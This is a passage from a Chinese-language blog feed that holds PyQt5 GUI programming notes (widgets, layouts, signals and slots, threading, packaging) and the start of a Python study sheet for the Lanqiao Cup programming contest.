class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="comment"># 调用本程序</span></span><br><span class="line">app = QApplication(sys.argv)</span><br><span class="line"><span class="comment"># 设置名称</span></span><br><span class="line">app.setApplicationName(<span class="string">&quot;Hello World&quot;</span>)</span><br><span class="line"><span class="comment"># 初始化窗体</span></span><br><span class="line">w = QWidget()</span><br><span class="line"><span class="comment"># 设置窗口标题</span></span><br><span class="line">w.setWindowTitle(<span class="string">&quot;Hello World&quot;</span>)</span><br><span class="line"><span class="comment"># 展示窗口</span></span><br><span class="line">w.show()</span><br><span class="line"><span class="comment"># 程序进行循环等待状态</span></span><br><span class="line">app.exec_()</span><br></pre></td></tr></table></figure><h4 id="1-2-格式案例"><a href="#1-2-格式案例" class="headerlink" title="1.2 格式案例"></a>1.2 格式案例</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyWindow</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(MyWindow, self).__init__()</span><br><span class="line">        <span class="comment"># 设置窗口标题</span></span><br><span class="line">        self.setWindowTitle(<span class="string">&quot;系统&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    w = MyWindow()</span><br><span class="line">    w.show()</span><br><span class="line">    app.exec_()</span><br></pre></td></tr></table></figure><h4 id="1-3-窗口类型"><a href="#1-3-窗口类型" class="headerlink" title="1.3 窗口类型"></a>1.3 窗口类型</h4><ul><li>QWidget：控件和窗口的父类，自由度高（无其他区域），没有划分菜单、工具栏、状态栏、主窗口等区域。</li><li>QMainWindow：是 QWidget 的子类，包含菜单栏、工具栏、状态栏、标题栏等，中间部分则为主窗口区域。</li><li>QDialog：对话框窗口的基类。</li><li>QMessage：消息窗口。</li></ul><h4 id="1-4-QDialog"><a href="#1-4-QDialog" class="headerlink" title="1.4 QDialog"></a>1.4 QDialog</h4><blockquote><p><a href="https://blog.csdn.net/jia666666/article/details/81539733">QDialog</a></p></blockquote><ul><li><p>QFileDialog</p><blockquote><p> <a href="https://blog.csdn.net/jia666666/article/details/81560756">QFileDialog</a></p><p>例：<code>image_file, _ =QFileDialog.getOpenFileName(self,&#39;Open file&#39;,&#39;C:\\&#39;,&#39;Image files (*.jpg *.gif *.png *.jpeg)&#39;)</code></p></blockquote><ol><li>self：用于指定父组件。</li><li>‘open file’：是QFileDialog对话框的标题。</li><li>‘C:\’默认打开的目录，Linux 和 Windows 杠不同，””表示当前目录。</li><li>对话框中文件扩展名过滤器（fliter）,比如使用’Image files (.jpg .gif .png .jpeg)’表示只能显示扩展名为.jpg,.gif等文件。</li></ol></li></ul><h4 id="1-5-QMessage"><a href="#1-5-QMessage" class="headerlink" title="1.5 QMessage"></a>1.5 QMessage</h4><ul><li><p>函数</p><blockquote><p><a href="https://blog.csdn.net/jia666666/article/details/81540785">QMessage</a></p><p>QMessageBox.Critical：错误窗口</p></blockquote></li></ul><h4 id="1-6-窗口属性"><a href="#1-6-窗口属性" class="headerlink" title="1.6 窗口属性"></a>1.6 窗口属性</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置窗口大小</span></span><br><span class="line">obj.resize(x,y)</span><br><span class="line"><span class="comment"># 移动屏幕至目标位置</span></span><br><span class="line">obj.move(x,y)</span><br><span class="line"><span class="comment"># 对象的 x , y , w , h</span></span><br><span class="line">obj.frameGeometry()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置风格</span></span><br><span class="line">obj.setStyleSheet(<span class="string">&quot;backgroud-color:grey;&quot;</span>)</span><br><span class="line"><span class="comment"># 设置中心内容显示</span></span><br><span class="line">obj.setCentralWidget(label)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mac菜单栏会在屏幕顶部而非程序顶部，该设置为真可以让Mac也同Windows一样</span></span><br><span class="line">menu.setNativeMenuBar(<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h4 id="1-7-案例"><a href="#1-7-案例" class="headerlink" title="1.7 案例"></a>1.7 案例</h4><ul><li><p>隐藏标题栏</p><blockquote><p><a href="https://blog.csdn.net/marwenx/article/details/107226153">隐藏标题栏</a></p><p><code>self.setWindowFlags(QtCore.Qt.CustomizeWindowHint)</code></p></blockquote></li><li><p>设置窗口显示在正中心</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">width = <span class="number">300</span></span><br><span class="line">height = <span class="number">300</span></span><br><span class="line">window.resize(width , height)</span><br><span class="line"><span class="comment"># 获得物体左上角的点在中心的坐标</span></span><br><span class="line">center_point = QDesktopWidget().availableGeometry().center()    </span><br><span class="line">x = center_point.x()</span><br><span class="line">y = center_point.y()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法1：</span></span><br><span class="line">window.move(x - width // <span class="number">2</span>,y - height // <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2：</span></span><br><span class="line"><span class="comment"># 获得框架的 x , y , w , h</span></span><br><span class="line">old_x,old_y,wi,he = w.frameGeometry().getRect()    </span><br><span class="line">window.move(x - wi // <span class="number">2</span>, y - he // <span class="number">2</span>)</span><br><span class="line">window.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接设置</span></span><br><span class="line">self.setCentralWidget(container)</span><br></pre></td></tr></table></figure></li></ul><hr><h3 id="2-控件"><a href="#2-控件" class="headerlink" title="2 控件"></a>2 控件</h3><h4 id="2-1-按钮"><a href="#2-1-按钮" class="headerlink" title="2.1 按钮"></a>2.1 按钮</h4><blockquote><p><a href="https://www.cnblogs.com/ygzhaof/p/10059540.html">按钮</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 展现按钮</span></span><br><span class="line"><span class="built_in">bin</span> = QPushButton( <span class="string">&quot;按钮&quot;</span> )</span><br><span class="line"><span class="built_in">bin</span>.setParent( window )  <span class="comment"># 在父物体上展示</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"><span class="built_in">bin</span> = QPushButton( <span class="string">&quot;按钮&quot;</span> , w )</span><br></pre></td></tr></table></figure><h4 id="2-2-文本"><a href="#2-2-文本" class="headerlink" title="2.2 文本"></a>2.2 文本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 标签</span></span><br><span class="line">label = QLabel(<span class="string">&quot;账号:&quot;</span>, window )</span><br></pre></td></tr></table></figure><h4 id="2-3-文本框"><a href="#2-3-文本框" class="headerlink" title="2.3 文本框"></a>2.3 文本框</h4><blockquote><p><a href="https://zhuanlan.zhihu.com/p/34323103">QPlainTextEdit</a>   </p><p><a href="https://blog.csdn.net/sinat_41752325/article/details/128516594">常用信号</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># QLineEdit</span></span><br><span class="line"><span class="comment"># 文本框</span></span><br><span class="line">line = QLineEdit( window )</span><br><span class="line"><span class="comment"># 函数结束才显示文本</span></span><br><span class="line">line.setPlainText(res)</span><br><span class="line"><span class="comment"># 框中自动显示文本</span></span><br><span class="line">line.setPlaceholderText( <span class="string">&quot;text&quot;</span> )</span><br><span class="line"><span class="comment"># 获得文本</span></span><br><span class="line">line.text()</span><br><span class="line"></span><br><span class="line"><span class="comment"># QPlainTextEdit，类记事本。</span></span><br><span class="line">text = QPlainTextEdit()</span><br><span class="line"><span class="comment"># 获得文本</span></span><br><span class="line">text.toPlainText()</span><br><span class="line"></span><br><span class="line">undo <span class="comment"># 撤回</span></span><br><span class="line">redo <span class="comment"># 前进</span></span><br></pre></td></tr></table></figure><h4 id="2-4-选项框"><a href="#2-4-选项框" class="headerlink" title="2.4 选项框"></a>2.4 选项框</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 选项组</span></span><br><span class="line">hobby_box = QGroupBox(<span class="string">&quot;爱好&quot;</span>)</span><br><span class="line"><span class="comment"># 单个选项</span></span><br><span class="line">bt1 = QRadioButton(<span class="string">&quot;抽烟&quot;</span>)</span><br><span class="line"><span class="comment"># 添加按钮到组</span></span><br><span class="line">hobby_box.addButton(bt1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下拉框</span></span><br><span class="line">Qbox = QComboBox()</span><br><span class="line"><span class="comment"># 添加选项们到下拉框中，字典，键是名字，值是返回值。</span></span><br><span class="line">Qbox.addItems(<span class="built_in">dict</span>)</span><br><span class="line"><span class="comment"># 下拉框值改变发送信号</span></span><br><span class="line">QBox.currentTextChanged[<span class="built_in">str</span>].connect(slot)</span><br></pre></td></tr></table></figure><h4 id="2-5-滚动对象"><a href="#2-5-滚动对象" class="headerlink" title="2.5 滚动对象"></a>2.5 滚动对象</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">QScrollArea()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加自动滚动条</span></span><br><span class="line">scroll = QScrollArea()</span><br><span class="line">v_layout = QVBoxLayout()</span><br><span class="line">v_layout.addWidget(scroll)</span><br></pre></td></tr></table></figure><h4 id="2-6-计数器"><a href="#2-6-计数器" class="headerlink" title="2.6 计数器"></a>2.6 计数器</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 计数器</span></span><br><span class="line">spin = QSpinBox()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置范围</span></span><br><span class="line">spin.setRange(<span class="built_in">min</span>,<span class="built_in">max</span>,[step=<span class="number">1</span>])</span><br><span class="line"><span class="comment"># 其他单个设置</span></span><br><span class="line">spin.spin.setMinimum()</span><br><span class="line">spin.setMaximum()</span><br><span class="line">spin.setValue()</span><br><span class="line">spin.singleStep()</span><br><span class="line"><span class="comment"># 返回属性值</span></span><br><span class="line">spin.value()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 值改变信号</span></span><br><span class="line">spin.valueChanged.connect(slot)</span><br></pre></td></tr></table></figure><h4 id="2-7-控件属性"><a href="#2-7-控件属性" class="headerlink" title="2.7 控件属性"></a>2.7 控件属性</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 返回属性值</span></span><br><span class="line">obj.value()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置位置和宽高</span></span><br><span class="line">obj.setGeometry(x,y,w,h)</span><br><span class="line"><span class="comment"># 设置固定宽高</span></span><br><span class="line">obj.setFixedSize(x,y)</span><br><span class="line"><span class="comment"># 框架的 x , y</span></span><br><span class="line">obj.frameSize()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动换行</span></span><br><span class="line">obj.setWordWrap(<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 显示内容靠上</span></span><br><span class="line">obj.setAlignment(Qt.AlignTop)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置文本（html）</span></span><br><span class="line">obj.setText / setPlainText(text)</span><br><span class="line"><span class="comment"># 设置注释（在下面）</span></span><br><span class="line">obj.setStatusTip(text)</span><br><span class="line"><span class="comment"># 设置快捷键</span></span><br><span class="line">obj.setShortcut(<span class="string">&quot;Ctrl+N&quot;</span>)</span><br><span class="line"><span class="comment"># 设置文本框显示格式（全窗口显示或非全窗口显示）</span></span><br><span class="line">setLineWrapMode(<span class="number">1</span> <span class="keyword">if</span> text.lineWrapMode() == <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有新内容则进行更新</span></span><br><span class="line">obj.repaint()</span><br></pre></td></tr></table></figure><hr><h3 id="3-基础布局"><a href="#3-基础布局" class="headerlink" title="3 基础布局"></a>3 基础布局</h3><h4 id="3-1-盒子"><a href="#3-1-盒子" class="headerlink" title="3.1 盒子"></a>3.1 盒子</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">QHBoxLayout <span class="comment"># 水平</span></span><br><span class="line">QVBoxLayout <span class="comment"># 垂直</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置布局规则并应用布局</span></span><br><span class="line">layout = QVBoxLayout()</span><br><span class="line">window.setLayout(layout)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加控件到布局器中</span></span><br><span class="line">layout.addWidget(obj)</span><br><span class="line"><span class="comment"># 添加一个伸缩器，挤压空间，num是与其他伸缩器的比例</span></span><br><span class="line">layout.addStretch([num])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 布局嵌套</span></span><br><span class="line">layout.addWidget(layout)</span><br></pre></td></tr></table></figure><h4 id="3-2-网格"><a href="#3-2-网格" class="headerlink" title="3.2 网格"></a>3.2 网格</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 网格布局，九宫格布局</span></span><br><span class="line">QGridLayout</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加控件到布局器中（第几行第几列）</span></span><br><span class="line">layout.addWidget(obj,row,col)</span><br><span class="line"><span class="comment"># 添加布局器到布局器中</span></span><br><span class="line">layout.addLayout(bt)</span><br></pre></td></tr></table></figure><h4 id="3-3-表单"><a href="#3-3-表单" class="headerlink" title="3.3 表单"></a>3.3 表单</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 表单</span></span><br><span class="line">QFormLayout</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加控件在同一行</span></span><br><span class="line">layout.addRow(obj_1 , obj_2 , ...)</span><br></pre></td></tr></table></figure><h4 id="3-4-抽屉"><a href="#3-4-抽屉" class="headerlink" title="3.4 抽屉"></a>3.4 抽屉</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 控件抽屉</span></span><br><span class="line">stacked_layout = QStackedLayout()</span><br><span class="line"><span class="comment"># 界面抽屉</span></span><br><span class="line">stacked_widget = QStackWidget()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置抽屉显示（默认为0）</span></span><br><span class="line">stack.setCurrentIndex(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 添加控件入屉</span></span><br><span class="line">stacked_layout.addChildLayout(init_layout)</span><br><span class="line">stacked_widget.addWidget(init_layout)</span><br></pre></td></tr></table></figure><h4 id="3-5-布局属性"><a href="#3-5-布局属性" class="headerlink" title="3.5 布局属性"></a>3.5 布局属性</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加部件，alianment对齐方式</span></span><br><span class="line">Box.addWidget(layout,alignment=Qt.AlignCenter)</span><br><span class="line"><span class="comment"># 属性：Qt.AlignTop,QTabWidget.AlignBottom,QTabWidget.AlignLeft,Qt.AlignRight,Qt.AlignHCenter,Qt.AlignBottom</span></span><br></pre></td></tr></table></figure><hr><h3 id="4-顶端栏"><a href="#4-顶端栏" class="headerlink" title="4 顶端栏"></a>4 顶端栏</h3><h4 id="4-1-顶端栏"><a href="#4-1-顶端栏" class="headerlink" title="4.1 顶端栏"></a>4.1 顶端栏</h4><blockquote><p><a href="https://blog.csdn.net/jia666666/article/details/81589679">QMenuBar</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置菜单栏并加到栏目选项内。（不能分开）</span></span><br><span class="line">menu = self.menuBar().addMenu(<span class="string">&quot;&amp;name&quot;</span>)</span><br><span class="line"><span class="comment"># 添加菜单选项</span></span><br><span class="line">file_menu.addAction(name)</span><br></pre></td></tr></table></figure><h4 id="4-2-状态栏"><a href="#4-2-状态栏" class="headerlink" title="4.2 状态栏"></a>4.2 状态栏</h4><blockquote><p><a href="https://blog.csdn.net/jia666666/article/details/81589928">QStatuBar </a>   <a href="https://blog.csdn.net/jia666666/article/details/81589803">QToolBar</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># QStatusBar</span></span><br><span class="line"><span class="comment"># 初始化状态栏</span></span><br><span class="line">self.status = QStatusBar()</span><br><span class="line"><span class="comment"># 加入到窗口中</span></span><br><span class="line">self.setStatusBar(self.status)</span><br><span class="line"></span><br><span class="line"><span class="comment"># QToolBar</span></span><br><span class="line"><span class="comment"># 初始化工具栏</span></span><br><span class="line">self.status = QToolBar()</span><br><span class="line"><span class="comment"># 添加分割线</span></span><br><span class="line">obj.addSeparator()</span><br></pre></td></tr></table></figure><hr><h2 id="四、PyQt5-QtGui"><a href="#四、PyQt5-QtGui" class="headerlink" title="四、PyQt5.QtGui"></a>四、PyQt5.QtGui</h2><h3 id="1-图标"><a href="#1-图标" class="headerlink" title="1 图标"></a>1 图标</h3><blockquote><p><a href="https://blog.csdn.net/seniorwizard/article/details/109820641">QAction</a>    </p><p><a href="https://www.easyicon.cc/">图标网</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加图标</span></span><br><span class="line">window.setWindowIcon(QIcon(<span class="string">&quot;img.png&quot;</span>))</span><br><span class="line"><span class="comment"># 设置宽高</span></span><br><span class="line">widget.setIconSzie(Qsize(w,h))</span><br><span class="line"></span><br><span class="line"><span class="comment"># QAction，用于菜单栏、工具栏或自定义快捷键的抽象动作行为。</span></span><br><span class="line">QAction</span><br></pre></td></tr></table></figure><h3 id="2-字体"><a href="#2-字体" class="headerlink" title="2 字体"></a>2 字体</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># QFont初始化字体类</span></span><br><span class="line">font = QFont()</span><br><span class="line"></span><br><span class="line"><span class="comment"># QFontDatabase，提供了关于底层窗口系统中可用字体的信息。</span></span><br><span class="line">QFontDatabase</span><br><span class="line"><span class="comment"># 设置字体，返回字体（type：QFontDatabase.FixedFont）</span></span><br><span class="line">fixedfont = QFontDatabase.systemFont( <span class="built_in">type</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置字大小</span></span><br><span class="line">fixedfont.setPointSize(num)</span><br><span class="line"><span class="comment"># 设置字加粗</span></span><br><span class="line">fixedfont.setBold(<span class="built_in">bool</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加到控件中</span></span><br><span class="line">self.editor.setFont(fixedfont)</span><br></pre></td></tr></table></figure><hr><h2 id="五、PyQt5-QtCore"><a href="#五、PyQt5-QtCore" class="headerlink" title="五、PyQt5.QtCore"></a>五、PyQt5.QtCore</h2><h3 id="1-信号与槽"><a href="#1-信号与槽" class="headerlink" title="1 信号与槽"></a>1 信号与槽</h3><ul><li><p>链接    </p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/617157844">信号与槽</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 对象.信号.connect( 槽函数 )，绑定信号与槽</span></span><br><span class="line">obj.signal.connect( slot )</span><br><span class="line"><span class="comment"># 发射信号触发槽（括号中填入槽函数参数，可多个）</span></span><br><span class="line">obj.signal.emit( func_argv )</span><br><span class="line"></span><br><span class="line"><span class="comment"># slot 传参</span></span><br><span class="line"><span class="keyword">lambda</span>: self.func( a , b , ... )</span><br></pre></td></tr></table></figure></li><li><p>signal</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 点击</span></span><br><span class="line">clicked</span><br><span class="line"><span class="comment"># 触发器</span></span><br><span class="line">triggered</span><br><span class="line"><span class="comment"># 当前文本值改变</span></span><br><span class="line">currentTextChanged[<span class="built_in">str</span>]</span><br><span class="line"><span class="comment"># 值改变</span></span><br><span class="line">valueChanged</span><br></pre></td></tr></table></figure></li><li><p>自定义信号</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 注：只作类变量（str，[dict]，[list]）</span></span><br><span class="line">my_signal = pyqtSignal( <span class="built_in">str</span> , .... )：</span><br><span class="line"><span class="comment"># 然后绑定信号，发送信号</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="2-多线程"><a href="#2-多线程" class="headerlink" title="2 多线程"></a>2 多线程</h3><ul><li><p>创建线程与使用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主函数</span></span><br><span class="line">self.ui = MyThread()</span><br><span class="line">self.ui.start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 线程类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span>( <span class="title class_ inherited__">QThread</span> ):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params"> self </span>):</span><br><span class="line">    <span class="comment"># start</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li><li><p>多线程信号</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主线程</span></span><br><span class="line"><span class="comment"># 主线程函数，信号值存入res中</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_Text</span>(<span class="params">self,res</span>): <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># 主函数绑定信号发送给类中什么函数，然后启动线程</span></span><br><span class="line">self.attack = AttackThread() </span><br><span class="line"><span class="comment"># 绑定子线程接受信号函数</span></span><br><span class="line">self.attack.receive_signal.connect(attack.receive_Signal)</span><br><span class="line"><span class="comment"># 绑定子线程发送给主线程的函数</span></span><br><span class="line">self.attack.send_signal.connect(self.update_Text)</span><br><span class="line"><span class="comment"># 可以提前发送一个信号给子线程</span></span><br><span class="line">self.attack.receive_signal.emit(para)</span><br><span class="line"><span class="comment"># 启动子线程，子线程运行run</span></span><br><span class="line">self.attack.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 子线程</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AttackThread</span>(<span class="title class_ inherited__">QThread</span>):</span><br><span class="line">    <span class="comment"># 初始化自定义信号和信号类型</span></span><br><span class="line">    receive_signal = pyqtSignal(<span class="built_in">list</span>)</span><br><span class="line">    send_signal = pyqtSignal(<span class="built_in">str</span>)</span><br><span class="line">    <span class="comment"># 定义接受主线程的函数，信号值存入para中</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">receive_Signal</span>(<span class="params">self,para</span>): <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="六、打包"><a href="#六、打包" class="headerlink" title="六、打包"></a>六、打包</h2><ul><li><p>窗口化应用程序作为单文件可执行文件</p><p><code>pyinstaller --onefile --windowed myfile.py</code></p></li></ul><hr><h2 id="七、问题"><a href="#七、问题" class="headerlink" title="七、问题"></a>七、问题</h2><h3 id="1-QtWebEngineWidgets"><a href="#1-QtWebEngineWidgets" class="headerlink" title="1 QtWebEngineWidgets"></a>1 QtWebEngineWidgets</h3><blockquote><p> <a href="https://www.cnblogs.com/Yanjy-OnlyOne/p/12068344.html">安装QtWebEngineWidgets</a></p></blockquote><ol><li>pip install pyqt5==5.10.1</li><li>pip install PyQtWebEngine</li></ol><hr><h2 id="八、案例"><a href="#八、案例" class="headerlink" title="八、案例"></a>八、案例</h2><ul><li><a href="https://www.cnblogs.com/dcb3688/p/4241048.html">简单二维码</a>    <a href="https://blog.csdn.net/qq_47452807/article/details/124233469">复杂二维码</a></li><li><a href="https://link.zhihu.com/?target=https%3A//github.com/learnpyqt/15-minute-apps">普通十五个项目</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Python </tag>
            
            <tag> 界面 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python蓝桥杯题集</title>
      <link href="/posts/ea53bcd3.html"/>
      <url>/posts/ea53bcd3.html</url>
      
        <content type="html"><![CDATA[<h1 id="Python蓝桥杯题集"><a href="#Python蓝桥杯题集" class="headerlink" title="Python蓝桥杯题集"></a>Python蓝桥杯题集</h1><blockquote><p><a href=".\a378bd8e">text::Python</a> </p><p><a href=".\4b0178e0">text::数据结构与算法</a> </p></blockquote><h2 id="一、基础使用"><a href="#一、基础使用" class="headerlink" title="一、基础使用"></a>一、基础使用</h2><h3 id="1-输入输出"><a href="#1-输入输出" class="headerlink" title="1 输入输出"></a>1 输入输出</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">input</span>() <span class="comment"># 数字：eval()</span></span><br><span class="line"><span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><h3 id="2-数据处理"><a href="#2-数据处理" class="headerlink" title="2 数据处理"></a>2 数据处理</h3><ul><li><p>lst</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列表第一列排序（指定列排序）</span></span><br><span class="line">lst.sort(key=<span class="keyword">lambda</span> x:x[<span class="number">0</span>])</span><br></pre></td></tr></table></figure></li><li><p>num</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">quotient , remainder = <span class="built_in">divmod</span>( dividend , divisor )</span><br><span class="line"><span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"><span class="built_in">chr</span>(<span class="number">65</span>)</span><br></pre></td></tr></table></figure></li><li><p>dict</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字典键值互换</span></span><br><span class="line">dic2 = &#123;value: key <span class="keyword">for</span> key, value <span class="keyword">in</span> dic1.items()&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 键最大的键（返回最大值的键值）</span></span><br><span class="line"><span class="built_in">max</span>(dic)</span><br><span class="line"><span class="comment"># 值最大的值</span></span><br><span class="line"><span class="built_in">max</span>(dic.values())</span><br><span class="line"><span class="comment"># 键最大的值</span></span><br><span class="line">dic[<span class="built_in">max</span>(dic)]</span><br><span class="line"><span class="comment"># 值最大的键</span></span><br><span class="line"><span class="built_in">max</span>(dic,key=dic.get)</span><br><span class="line"><span class="built_in">max</span>(dic,key=<span class="keyword">lambda</span> x:<span class="built_in">len</span>(dic[x])) <span class="comment"># （列表）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表变成字典</span></span><br><span class="line">lst = [[key,value ],...]</span><br><span class="line">dic = <span class="built_in">dict</span>(lst)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>str</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字符串子串</span></span><br><span class="line">s = s[::]</span><br><span class="line"><span class="comment"># 去空</span></span><br><span class="line">strip()</span><br><span class="line"><span class="comment"># 分离字符串</span></span><br><span class="line">lst.split( <span class="string">&quot; &quot;</span> )</span><br><span class="line"><span class="comment"># 拼接字符串</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.join( lst )（ lst中的元素必须是字符串 ）</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-函数"><a href="#3-函数" class="headerlink" title="3 函数"></a>3 函数</h3><ul><li><p>Counter()</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/355601478">Counter()</a></p><p>计数器，Counter 中的键为待计数的元素，而 value 值为对应元素出现的次数 count。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用Counter应当 from collections import Counter </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="comment"># 实例化元素为空的 Counter 对象</span></span><br><span class="line">a = Counter()</span><br><span class="line"><span class="comment"># 从可迭代对象中实例化 Counter 对象</span></span><br><span class="line">b = Counter(<span class="string">&#x27;chenkc&#x27;</span>)</span><br><span class="line"><span class="comment"># 从 mapping 中实例化 Counter 对象</span></span><br><span class="line">c = Counter(&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>:<span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>:<span class="number">3</span>&#125;)</span><br><span class="line"><span class="comment"># 从关键词参数中实例化 Counter 对象</span></span><br><span class="line">d = Counter(a = <span class="number">1</span>, b = <span class="number">2</span>, c = <span class="number">3</span>)</span><br></pre></td></tr></table></figure></li><li><p>enumerate</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 从可迭代对象中枚举</span></span><br><span class="line"><span class="keyword">for</span> i,element <span class="keyword">in</span> <span class="built_in">enumerate</span>(seq):</span><br><span class="line">    <span class="built_in">print</span>(i,element)</span><br></pre></td></tr></table></figure></li><li><p>时间函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="comment"># 当天日期</span></span><br><span class="line">now = datetime.datetime.strptime(date, <span class="string">&#x27;%Y-%m-%d&#x27;</span>).date()</span><br><span class="line"><span class="comment"># 日期加一</span></span><br><span class="line">now += datetime.timedelta(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li></ul><h2 id="二、常见题型"><a href="#二、常见题型" class="headerlink" title="二、常见题型"></a>二、常见题型</h2><h3 id="1-杨辉三角"><a href="#1-杨辉三角" class="headerlink" title="1 杨辉三角"></a>1 杨辉三角</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">YangHui</span> (num = <span class="number">10</span>):</span><br><span class="line">    LL = [[<span class="number">1</span>]]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,num):</span><br><span class="line">        LL.append([(<span class="number">0</span> <span class="keyword">if</span> j== <span class="number">0</span> <span class="keyword">else</span> LL[i-<span class="number">1</span>][j-<span class="number">1</span>])+ (<span class="number">0</span> <span class="keyword">if</span> j ==<span class="built_in">len</span>(LL[i-<span class="number">1</span>]) <span class="keyword">else</span> 